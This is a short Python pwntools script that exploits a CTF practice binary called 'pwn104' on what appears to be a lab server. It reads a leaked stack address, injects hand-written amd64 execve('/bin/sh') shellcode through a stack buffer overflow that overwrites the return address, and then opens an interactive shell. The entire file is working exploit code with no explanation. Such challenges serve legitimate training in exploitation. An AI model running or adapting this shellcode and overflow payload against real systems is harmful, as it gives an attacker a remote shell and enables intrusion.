#!/usr/bin/python3
from pwn import *

exe = ELF("./pwn104.pwn104", checksec = False)
#con = process("./pwn104.pwn104")
con = remote("10.10.155.214", 9004)
#gdb.attach(con, gdbscript = "start")

shellcode = asm(
        '''
        mov rax, 0x3b
        xor rdx, rdx
        mov rsi, 0x68732f6e69622f
        push rsi
        xor rsi, rsi
        mov rdi, rsp
        syscall
        ''', arch = 'amd64')

con.recvuntil(b"I'm waiting for you at ")
leak = int(con.recv(), 16)
print(hex(leak))
input()
payload = shellcode.ljust(88) + p64(leak)

con.send(payload)
con.interactive()
